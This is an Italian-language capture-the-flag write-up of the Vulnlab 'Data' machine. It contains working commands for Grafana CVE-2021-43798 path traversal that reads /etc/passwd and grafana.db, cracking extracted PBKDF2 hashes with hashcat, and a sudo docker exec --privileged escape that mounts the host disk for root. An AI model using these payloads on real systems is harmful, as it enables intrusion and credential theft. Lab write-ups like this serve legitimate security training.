+++
date = '2026-05-23T19:18:39+02:00'
draft = false
title = 'Data Writeup IT'
+++
**Nome**: `joy.scd01`

**Data**: `05/06/2025`

![data_slide.png](/images/imgs_data/data_slide.png)

---
# Introduzione

_Data_ è una macchina Linux di livello _Easy_ incentrata sull’abuso di una nota vulnerabilità di Grafana (CVE-2021-43798), che consente di leggere file tramite directory traversal. Questo mi ha permesso di accedere a file sensibili e recuperare le credenziali di accesso.

Una volta ottenuto accesso alla macchina, ho scoperto che stavo operando all’interno di un container Docker, e grazie a una configurazione errata dei permessi `sudo`, sono riuscito a eseguire comandi Docker privilegiati. Da lì ho ottenuto una shell root sulla macchina principale.

---
# Tecniche utilizzate

-  **Arbitrary File Read via Directory Traversal (Grafana CVE-2021-43798)**
-  **Password Cracking**
-  **Docker escape via privileged container execution**

---
# Enumerazione

## nmap

Scansione iniziale su tutte le porte:

```bash
nmap -p- data
```

![nmap1.png](/images/imgs_data/nmap1.png)

Scansione mirata con script e servizi:

```bash
nmap -sC -sV data
```

![nmap2.png](/images/imgs_data/nmap2.png)

**2 porte aperte**:
-  **22/tcp** - SSH
-  **3000/tcp** - HTTP

## Web - Grafana

Il servizio hostato sulla **porta 3000** espone un'interfaccia di **Grafana**, alla quale ho subito provato ad accedere con le credenziali di default **`admin:admin`**

![loginfail.png](/images/imgs_data/loginfail.png)

Come pensavo:  **Invalid username or password**

![grafana-web.png](/images/imgs_data/grafana-web.png)

A questo punto cercando su Google "**Grafana v8.0.0 cve**" ho trovato informazioni legate alla **CVE-2021-43798**, una vulnerabilità di **directory traversal** nel percorso-url **`/public/plugins/`** che permette di leggere file nel sistema.

_Per sfruttare questa vulnerabilità, online sono presenti script che automatizzano la creazione dei payload malevoli, ma per un fattore di preferenza mia, allenamento e migliore leggibilità dei dati in output io l'ho sfruttata manualmente_

Ho fatto quindi un paio di prove per vedere quali file riuscissi ad ottenere e craftando il seguente payload sono riuscito a leggere il file **`/etc/passwd`**:

```bash
curl --path-as-is http://data.htb:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd --output grafana.db

cat grafana.db
```

![etc-passwd-cutted.png](/images/imgs_data/etc-passwd-cutted.png)

Questo oltre a confermarmi la vulnerabilità, mi ha fornito un dettaglio interessante che mi è poi stato utile una volta ottenuto accesso alla macchina, ovvero **la presenza dell'utente `grafana`**.

---
# Accesso Iniziale -  CVE-2021-43798 | Directory Traversal → Arbitrary File Read → Password Cracking

A questo punto ho provato a scaricare un file più interessante: **`grafana.db`**, che di default è situato in **`/var/lib/grafana`**.

Per farlo ho utilizzato il seguente payload:

```bash
curl --path-as-is http://data.htb:3000/public/plugins/alertlist/../../../../../../../../../../var/lib/grafana/grafana.db --output grafana.db
```

![downloadgrafana.png](/images/imgs_data/downloadgrafana.png)

Analizzando il database, nella tabella **`user`** ho trovato l'utente **`boris`** con la relativa **password hashata**.

```sql
sqlite3 grafana.db
.tables
select * from user;
```

![sqlite3.png](/images/imgs_data/sqlite3.png)

Hash che, grazie ad una piccola ricerca su Google riguardante gli hash di Grafana, si è rivelato essere in formato **PBKDF2**.

In poche parole Grafana utilizza l'algoritmo di hashing **PBKDF2_HMAC_SHA256** e memorizza gli hash in formato esadecimale, mentre i valori di salt sono salvati in chiaro nel database.

Risorsa : https://github.com/iamaldi/grafana2hashcat

Questa repo, oltre a queste informazioni, offre uno script python (**grafana2hashcat.py**) che converte l'hash inserito, rendendo il formato finale supportato da **hashcat**.

Qui ammetto di essere quasi impazzito cercando di capire qual era il modo corretto per inserire l'hash all'interno del file... lanciavo lo script e continuavo a ricevere errori di sintassi.
Alla fine **bastava separare hash e salt da una virgola**, come espressamente scritto nell'esempio nella repo (credo di aver perso almeno 30 minuti in questo passaggio aka volevo piangere).

😢

_Qui voglio ricordare l'importanza di prendersi il tempo di leggere e comprendere a pieno tutto quello che si trova e i passaggi che si vanno a svolgere, parecchie volte capita di perdere tempo o stressarsi inutilmente per colpa della troppa fretta o della disattenzione._
.
.
.
![cat_ita.png](/images/imgs_data/cat_ita.png)

**Cooomunque**, ecco gli hash nel giusto formato :

```bash
python3 grafana2hashcat.py ../grafana_hashes.txt
```

![hashes.png](/images/imgs_data/hashes.png)

A questo punto mi è bastato copiare e incollare gli hash formattati in un altro file e lanciare **hashcat** con le flag suggerite alla fine dello script.

```bash
hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt
```

![hashcat.png](/images/imgs_data/hashcat.png)

Abbiamo delle credenziali (**`boris:beautiful1`**).
Credenziali che ho subito provato ad utilizzare per loggarmi tramite **SSH**.

```bash
ssh boris@data
```

![boris.png](/images/imgs_data/boris.png)

Così facendo ho ottenuto l'accesso iniziale alla macchina.
**Nella `/home` di `boris` ho trovato la user flag**.

---
# Privilege Escalation | Docker escape via --privileged container execution

Una volta ottenuto l'accesso come **boris**, ho iniziato la solita fase di enumerazione interna per cercare un modo per elevare i privilegi.

Per capire di essere dentro un **container Docker** mi è bastato guardare l'accesso **ssh** il quale ne specificava l'indirizzo **`IP address for docker0: 127.17.0.1`**.
Anche controllando il file **`/etc/passwd`** si possono notare differenze con il file di prima (**l'utente grafana non è presente, mentre l'utente boris si. Questo significa anche che grafana è il nome del container**).
Oltre a questi, ci sono svariati modi per capire se si è all'interno di un ambiente containerizzato.

## misconfigurazione sudo

```bash
sudo -l
```

![sudol.png](/images/imgs_data/sudol.png)

Come si può notare, analizzando i permessi di sudo, l'utente **boris** può eseguire qualsiasi comando per il binario **`/snap/bin/docker *`**, data la presenza della wildcard **`*`** che ne permette l'espansione.

```bash
sudo /snap/bin/docker exec -h
```

![flags.png](/images/imgs_data/flags.png)

Le flag **--privileged** e **--user** sono la chiave per compromettere il sistema.
In poche parole permettono di eseguire comandi dentro un container docker già in esecuzione (in questo caso, **grafana**) come un utente specifico, **e con privilegi estesi** (in questo caso, **root**)

A questo punto l'ultima informazione di cui avevo bisogno era sapere dove fosse montato il file system **host**.

```bash
mount
```

![mount.png](/images/imgs_data/mount.png)

Montato in **`/dev/xvda1`**.

Da qui ho eseguito la tecnica di **container breakout**:

```bash
sudo docker exec --user root --privileged grafana mkdir /mnt/host
sudo docker exec --user root --privileged grafana mount /dev/xvda1 /mnt/host
sudo docker exec --user root --privileged -it grafana /bin/bash
```

![Privesc1.png](/images/imgs_data/Privesc1.png)
![Privesc2.png](/images/imgs_data/Privesc2.png)![Privesc3.png](/images/imgs_data/Privesc3.png)

**root access** e **root flag**.

# Conclusioni finali

Come al solito, trovo le macchine di Vulnlab dei capolavori.
Fanno sempre scoprire tecniche nuove, tool alternativi e informazioni su scenari potenzialmente ritrovabili nel mondo reale.

A parte il momento di blocco dovuto alla mia disattenzione nell'utilizzo dello script
"**grafana2hashcat**"  ho completato la macchina senza troppi problemi.

Tengo a precisare che la tecnica di container breakout era una tecnica che già conoscevo e avevo nel mio repertorio. Attualmente non ricordo da quale fonte l'avessi presa e cercando online attualmente non sembrano esserci riferimenti a questa precisa tecnica. Se dovessi ritrovare la fonte esatta la linkerò.

**Fonti**:

-  **Informazioni sulla vulnerabilità di Grafana** | https://nvd.nist.gov/vuln/detail/cve-2021-43798
-  **Exploit che automatizza lo sfruttamento della vulnerabilità** | https://www.exploit-db.com/exploits/50581
-  **Script per la conversione degli hash di Grafana** | https://github.com/iamaldi/grafana2hashcat